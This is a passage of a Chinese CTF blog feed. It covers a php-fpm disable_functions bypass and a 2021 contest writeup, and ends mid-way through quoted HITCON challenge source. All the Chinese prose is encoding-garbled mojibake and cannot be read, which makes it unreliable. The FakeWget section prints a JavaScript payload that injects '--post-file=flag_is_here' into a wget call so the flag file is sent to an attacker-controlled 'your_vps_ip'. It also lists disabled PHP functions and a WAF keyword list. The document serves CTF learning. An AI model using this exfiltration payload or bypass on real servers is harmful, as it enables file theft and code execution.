&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>è€ƒè™‘ç”¨&lt;code>create_function&lt;/code>æ¥rceï¼Œä¸è¿‡è¿˜æ˜¯ç»•ä¸è¿‡disable_functionsæ¥æ‰§è¡Œ/readflag&lt;/p>
&lt;p>ä¸è¿‡è·‘ä¸€ä¸‹ç»™å‡ºçš„dockerï¼Œå¯ä»¥çœ‹åˆ°ç”¨unix socketæ¨¡å¼è¿è¡Œçš„php-fpm&lt;/p>
&lt;p>é¢˜ç›®ç¯å¢ƒå®‰è£…äº†apacheæœåŠ¡å™¨å’Œapache-moduleæ¨¡å¼çš„phpæ¨¡å—ï¼ˆè¿™ä¸ªå°±æ˜¯é¢˜ç›®ç¯å¢ƒï¼‰ï¼Œä½†æ˜¯fpmä¹Ÿå®‰è£…äº†å¹¶ä¸”å¯åŠ¨&lt;/p>
&lt;p>fpmæ¨¡å¼çš„php.iniä¸phpinfoä¸­æ˜¾ç¤ºçš„ä¸åŒï¼Œæ˜¯ç‹¬ç«‹çš„ï¼Œdisable_funtcionsçš„é™åˆ¶å®½æ¾å¾ˆå¤šï¼Œæˆ‘ä»¬æ¥æ‰“å®ƒæ¥rceï¼Œexpå°±æ˜¯ä¸Šé¢é‚£ä¸ª&lt;/p>
&lt;hr>
&lt;p>æ‹–æ‹–æ‹‰æ‹‰å››äº”å¤©ï¼Œæ€»ç®—æ˜¯æŠ½ç©ºç»™æ€»ç»“å®Œäº†ï¼Œå¯¹åšé¢˜å’Œå­¦ä¹ æ–¹é¢åˆæœ‰äº†ä¸€äº›èˆ¹æ–°çš„ç†è§£ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶è·çš„&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgiåè®®åˆ†æä¸å®ä¾‹&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm ä¸ Nginxä¼˜åŒ–æ€»ç»“&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP è¿æ¥æ–¹å¼ &amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;amp;&amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp;&amp;amp; Expç¼–å†™&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">ã€æŠ€æœ¯åˆ†äº«ã€‘æ·±å…¥ FTP æ”»å‡» php-fpm ç»•è¿‡ disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä¸€ç‚¹å¯¹è¿‘å†µçš„ç¢ç¢å¿µ
&lt;/h4>
&lt;/summary>
&lt;p>æœ€è¿‘æœ‰ç‚¹è‡ªé—­ï¼Œçœ‹ç€é‚£ä¹ˆå¤šå’Œæˆ‘å­¦ä¹ æ—¶é—´å·®ä¸å¤šçš„å¸ˆå‚…éƒ½å·²ç»ç›¸å½“ç›¸å½“å‰å®³äº†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿåˆšå¼€å§‹ä¸€æ ·èœï¼Œæ»¡æ‰“æ»¡ç®—å­¦äº†ä¹ŸåŠå¹´å¤šäº†ï¼Œæ€ä¹ˆå°±è¿™ä¹ˆèœå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå·®è·å¤ªå¤§äº†ï¼Œä»–å¦ˆçš„å°±æ˜¯èœå•Š&lt;/p>
&lt;p>çœ‹çœ‹åˆ«äººåšå®¢éƒ½å†™å¾—å•¥ï¼Œcveå¤ç°ï¼Œæ¼æ´æŒ–æ˜ï¼Œæ¸—é€å®æˆ˜ï¼Œå®‰å…¨ç ”ç©¶ï¼Œæˆ‘å‘¢ï¼Ÿå…¨æ˜¯äº’è”ç½‘æ¹¿åƒåœ¾ï¼Œæ²¡ä¸€ç‚¹å«é‡‘é‡ï¼Œå°±ä¼šå†™ä¸€ç‚¹wpï¼Œè¿˜å¤§å¤šéƒ½æ˜¯å‚è€ƒäº†åˆ«äººçš„å†…å®¹ï¼Œç„¶åå†™ä¸€ç‚¹çŸ¥è¯†æ€»ç»“ï¼Œè·Ÿä¸ªå°å­¦ç”Ÿä¸€æ ·&lt;/p>
&lt;p>è¿™å‘¨ä¸‹äº†å†³å¿ƒæŠŠæ²¡ç”¨çš„è¯¾çš„å‡è¯·æ‰äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½åˆ©ç”¨èµ·æ¥ï¼Œåˆ«æ‘†äº†ï¼ŒçœŸåˆ«æ‘†äº†ï¼Œè¦å‡ºå¤§é—®é¢˜&lt;/p>
&lt;p>ä¸è¿‡æ€»ç»“æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œç°åœ¨çš„è¿›åº¦æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>phpååºåˆ—åŒ–ï¼šç¼º åŸç”Ÿç±»çš„å­¦ä¹ +è·Ÿä¸€äº›å®é™…çš„é“¾å­&lt;/li>
&lt;li>pythonååºåˆ—åŒ–ï¼šå®Œ&lt;/li>
&lt;li>sqliï¼šå·®ä¸å¤šå®Œï¼Œè¿˜å¾—å¤šåšç‚¹é¢˜åŠ æ·±ç†è§£&lt;/li>
&lt;li>SSTIï¼šå®Œ&lt;/li>
&lt;li>æ–‡ä»¶ä¸Šä¼ ï¼šä¹‹å‰9æœˆæ€»ç»“åˆ°ä¸€åŠå»æ‰“hvväº†&lt;/li>
&lt;li>php-fpmï¼šå®Œ&lt;/li>
&lt;li>GraphQLï¼šå®Œ&lt;/li>
&lt;/ul>
&lt;p>å¾ˆè–„å¼±çš„åœ°æ–¹éƒ½è¿˜æ²¡æŒæ¡ï¼ˆè¿™ä¸æ˜¯åºŸè¯ï¼‰ï¼Œå‡ ä¸ªæ€¥éœ€æ€»ç»“æŒæ¡çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ssrfï¼šä¸ç†Ÿç»ƒ&lt;/li>
&lt;li>xssï¼šåšé¢˜é‡åˆ°éƒ½æ˜¯èº²ç€èµ°&lt;/li>
&lt;li>jsåœ†å½¢æ±¡æŸ“ï¼šè·Ÿä¸Šé¢é‚£ä¸ªæ€»æ˜¯ä¸€èµ·å‡ºç°&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>è¿˜æœ‰javaï¼Œè¿™ä¸ªå¿…é¡»å¾—å­¦&lt;/p>
&lt;p>ä¸å¤šè¯´äº†ï¼Œå†²ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item><item><title>æ·±è‚²æ¯2021 Wp</title><link>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</link><pubDate>Wed, 17 Nov 2021 19:11:38 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</guid><description>&lt;h2 id="fakewget">FakeWget&lt;/h2>
&lt;blockquote>
&lt;p>åˆ©ç”¨shä¸‹grepå‘½ä»¤æ­£åˆ™ç¼ºé™·ç»•è¿‡æ­£åˆ™æ£€æŸ¥&lt;/p>
&lt;/blockquote>
&lt;p>è¿™ä¸ªé¢˜ï¼Œå°±éå¸¸çš„å¯æƒœï¼Œå…·ä½“çš„å°±ä¸è¯´äº†ï¼Œå¤ªä¸¢äººäº†ï¼Œæ€»ä¹‹ååˆ†æ‹‰è·¨ï¼Œç‰¹åˆ«å¯æƒœï¼Œç©¶æä¸‹é¥­ã€‚&lt;/p>
&lt;p>æ‰«ç›®å½•ï¼Œå¾—åˆ°/consoleï¼Œ/wgetï¼Œ/flagé¡µé¢å¾—åˆ°æç¤ºflagåœ¨/flag_is_here&lt;/p>
&lt;p>/wgetå¯ä»¥å‘é€urlè¿›è¡Œwgetçš„æ“ä½œï¼Œè·Ÿcurlä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥å‘é€postè¯·æ±‚æ»´ï¼Œè¿™é‡Œå¯¹è¾“å…¥çš„urlæœ‰æ£€æµ‹ï¼Œä¸å…è®¸æœ‰ç©ºæ ¼å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦&lt;/p>
&lt;p>è¿™é‡Œå…¶å®æœ‰ä¸ªåŸé¢˜&lt;a href="https://www.gem-love.com/ctf/2745.html">[çºµæ¨ªæ¯ 2020]magic_download&lt;/a>ï¼Œå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œshåœ¨grepæ—¶å¯ä»¥ç”¨æ¢è¡Œçš„æ“ä½œæ¥ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">senduri&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://your_vps_ip:port/\\n?\t--post-file=flag_is_here&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">JSEncrypt&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">publicKey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;-----BEGIN PUBLIC KEY-----\
&lt;/span>&lt;span style="color:#d88200">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\
&lt;/span>&lt;span style="color:#d88200">eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\
&lt;/span>&lt;span style="color:#d88200">+f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\
&lt;/span>&lt;span style="color:#d88200">MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\
&lt;/span>&lt;span style="color:#d88200">94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\
&lt;/span>&lt;span style="color:#d88200">H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\
&lt;/span>&lt;span style="color:#d88200">rwIDAQAB\
&lt;/span>&lt;span style="color:#d88200">-----END PUBLIC KEY-----&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setPublicKey&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">publicKey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">encryptdata&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">uri&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">encryptdata&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">encryptdata&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">$&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/wget&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easywaf">EasyWAF&lt;/h2>
&lt;blockquote>
&lt;p>different cookie means node pg vuln&lt;/p>
&lt;p>pay attention to the hint different cookie different means&lt;/p>
&lt;/blockquote>
&lt;p>ä»–å¦ˆçš„ ç»å…¸æ¯”èµ›ç»“æŸæ‰¾åˆ°åŸé¢˜ï¼ŒçœŸä¸€æ¨¡ä¸€æ ·ï¼Œåäº†&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard">https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">#!/usr/bin/node
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * @HITCON CTF 2017
&lt;/span>&lt;span style="color:#75715e"> * @Author Orange Tsai
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;qs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;pg&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mysql&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;crypto&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;express&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createPool&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">connectionLimit&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ban&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;bandb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">pg&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;userdb&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;select&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;union&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;and&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;or&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;\\&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>
&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">KEYWORDS&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;show_source&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFileSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__filename&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
